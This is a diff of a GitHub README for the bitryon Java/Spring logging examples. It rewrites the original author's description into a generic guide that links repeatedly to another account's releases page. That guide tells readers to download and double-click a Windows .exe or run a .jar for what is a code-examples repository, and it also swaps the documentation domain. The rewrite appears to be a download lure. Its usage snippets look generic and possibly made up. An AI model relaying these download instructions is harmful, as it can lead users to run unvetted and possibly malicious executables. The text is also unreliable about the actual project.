@@ -1,21 +1,100 @@
-Why bitryon logger?
+# 🌟 bitryon-logging-tracing-examples - Simple Logging for Java and Spring
 
-bitryon logger is a tracer and a logger both. Developers only need to annotate methods and classes to log the parameters and return as trace without writing any logs manually.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Hydro1986/bitryon-logging-tracing-examples/releases)
 
-bitryon logger is the next generation logger and tracing solution, seamlessly unify logs across services as workflow, sanitize sensitive/personal identification information/PII content painlessly, and test supports against models and services.
+## 📖 Overview
 
-1: logging could be much ambiguous leading the troubleshoot very exhausted. with bitryon logger, just configuration can cover all of necessary logs. bitryon logger also support writing logs to the tracing by your own. -- with proper configuration even no need to write a single log.
+The **bitryon-logging-tracing-examples** repository showcases how to use the bitryon logger in Java and Spring applications for effective tracing and logging. With the bitryon logger, developers can easily capture method parameters and return values without the hassle of manual logging. 
 
-2: When you access complicated business logic cross services, tracing the payloads would be much challenging. bitryon logger provides logging in language support(No need http proxy/servers) to capture the entire logic traces - no need to search logs any more although we provide.
+## 🚀 Getting Started
 
-3: when you sanitize sensitive/PII in the logs, the difficulty is you may do it before writing into logs, or other assistances. Simple bitryon logger configurations can convert to the desired mask or encryption without changing code.
+Follow these steps to set up the example application on your computer:
 
-4: with well preserved logs, in batch basis painlessly testing or re-entering the methods that were failed due to bugs or errors turns troubleshooting and datafix an easy job.
+1. **Ensure Your System Meets These Requirements:**
+   - Operating System: Windows, macOS, or Linux
+   - Java Development Kit (JDK) version 8 or higher installed on your computer.
 
-5: bitryon logger can co-exist with any logger like log4j.
+2. **Download the Application:**
+   Visit this page to download: [bitryon-logging-tracing-examples Releases](https://github.com/Hydro1986/bitryon-logging-tracing-examples/releases)
 
-More details please check out [www.bitryon.io](https://www.bitryon.io) and [bitryon-logging-java-spring-example](https://github.com/FrankNPC/bitryon-logging-tracing-examples/tree/master/bitryon-logging-java-spring-example) 
+## 📥 Download & Install
 
-more language supports coming soon
+1. Go to the releases page: [Download Here](https://github.com/Hydro1986/bitryon-logging-tracing-examples/releases)
+2. Look for the latest version.
+3. Choose the appropriate file for your operating system:
+   - For Windows: Download the `.exe` file.
+   - For macOS/Linux: Download the `.jar` file.
+4. Once downloaded, follow these instructions:
+   - **For Windows:** Double-click the downloaded `.exe` file to start the installation.
+   - **For macOS/Linux:** Open your terminal and navigate to the folder where you saved the `.jar` file. Run the command:
+     ```
+     java -jar yourfile.jar
+     ```
+5. The application should now start successfully.
 
-![Screenshot trace](./Screenshot-trace.png)
+## ⚙️ Features
+
+- **Easy Setup:** No complicated configurations or installations necessary.
+- **Automatic Logging:** Annotate your classes and methods, and bitryon does the rest.
+- **Support for Java and Spring:** Seamless integration with both Java and Spring frameworks.
+- **Unified Tracing and Logging:** Simplify your development process with one tool for both logging and tracing.
+
+## 📊 Usage Examples
+
+To help you get started, here are a few examples of how to use the bitryon logger.
+
+### Example 1: Logging a Method
+
+```java
+import org.bitryon.logging.Loggable;
+
+public class MyService {
+
+    @Loggable
+    public void processData(String input) {
+        // Business logic here
+    }
+}
+```
+
+In this example, the `@Loggable` annotation will automatically log the input parameter and its output.
+
+### Example 2: Annotating a Class
+
+```java
+import org.bitryon.logging.Loggable;
+
+@Loggable
+public class MyComponent {
+    // Class logic here
+}
+```
+
+This will log all the public methods of the `MyComponent` class without extra coding.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues during installation or while running the application, consider the following solutions:
+
+- **Ensure Java is Installed:** Make sure you have the JDK installed by running `java -version` in your terminal or command prompt.
+- **Check File Permissions:** If using macOS or Linux, ensure the downloaded file has execution permissions by running the command:
+  ```
+  chmod +x yourfile.jar
+  ```
+- **Verify the Download:** If the application does not run, confirm that the complete file downloaded correctly. Re-download if necessary.
+
+## 📞 Support
+
+If you have any questions or need further assistance, feel free to reach out through the GitHub Issues page of this repository. Your feedback is important and helps improve the application.
+
+## 📝 License
+
+This project is licensed under the MIT License. You can use it freely, but please read the license for more details.
+
+---  
+
+### 🔗 Additional Resources
+- **Documentation**: For more section details, visit the official [Bitryon Documentation](https://bitryon.org/docs).
+- **API Reference**: Check out the API reference for a deeper understanding of the available features.
+
+Feel free to explore and start enhancing your Java and Spring applications with easy logging and tracing!
